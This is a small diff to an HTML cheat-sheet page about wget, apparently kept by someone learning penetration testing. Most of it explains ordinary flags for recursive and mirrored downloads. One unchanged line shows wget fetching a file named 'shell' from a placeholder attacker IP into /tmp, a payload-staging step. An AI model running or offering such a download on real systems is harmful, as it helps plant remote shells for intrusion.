@@ -7,4 +7,13 @@
 -O&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;force to write to a directory, usually need to know full name of file and where getting from<br/>
 &nbsp; -O /tmp/shell http://&lt;ip&gt;/shell<br/>
 <br/>
-</body></html>
+wget -r -np -k http://www.ime.usp.br/~coelho/mac0122-2013/ep2/esqueleto/<br/>
+Other useful options:<br/>
+-r: recursive<br/>
+-np: don't folow links to parent directories<br/>
+-k: make links in downloaded HTML or CSS point to local files<br/>
+-nd (no directories): download all files to the current directory<br/>
+-e robots.off: ignore robots.txt files, don't download robots.txt files<br/>
+-A png,jpg: accept only files with the extensions png or jpg<br/>
+-m (mirror): -r --timestamping --level inf --no-remove-listing<br/>
+-nc, --no-clobber: Skip download if files exist</body></html>
